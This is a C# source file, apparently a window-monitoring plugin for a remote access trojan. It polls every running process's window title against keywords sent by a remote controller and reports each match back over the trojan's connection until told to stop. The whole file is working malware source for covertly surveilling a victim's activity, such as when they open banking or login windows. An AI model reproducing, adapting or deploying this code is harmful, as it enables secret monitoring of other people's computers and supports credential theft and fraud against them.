using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;

namespace Plugin.Handler
{
    class HandleReportWindow
    {
        private List<string> title;

        public HandleReportWindow(MsgPack unpack_msgpack)
        {
            switch (unpack_msgpack.ForcePathObject("Option").AsString)
            {

                case "run":
                    {
                        try
                        {
                            Initialize(unpack_msgpack);
                            int count = 30;
                            while (!Packet.ctsReportWindow.IsCancellationRequested)
                            {
                                foreach (Process window in Process.GetProcesses())
                                {
                                    if (string.IsNullOrEmpty(window.MainWindowTitle))
                                        continue;
                                    if (title.Any(window.MainWindowTitle.ToLower().Contains) && count > 30)
                                    {
                                        count = 0;
                                        SendReport(window.MainWindowTitle.ToLower());
                                    }
                                }
                                count++;
                                Thread.Sleep(1000);
                            }
                        }
                        catch { break; }
                        break;
                    }

                case "stop":
                    {
                        Packet.ctsReportWindow?.Cancel();
                        Connection.Disconnected();
                        break;
                    }
            }
        }

        private void Initialize(MsgPack unpack_msgpack)
        {
            Packet.ctsReportWindow?.Cancel();
            Packet.ctsReportWindow = new CancellationTokenSource();

            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "reportWindow-";
            Connection.Send(msgpack.Encode2Bytes());

            title = new List<string>();
            foreach (string s in unpack_msgpack.ForcePathObject("Title").AsString.ToLower().Split(new[] { "," }, StringSplitOptions.None))
                title.Add(s.Trim());
        }

        private void SendReport(string window)
        {
            Debug.WriteLine(window);
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "reportWindow";
            msgpack.ForcePathObject("Report").AsString = window;
            Connection.Send(msgpack.Encode2Bytes());
        }

    }

}
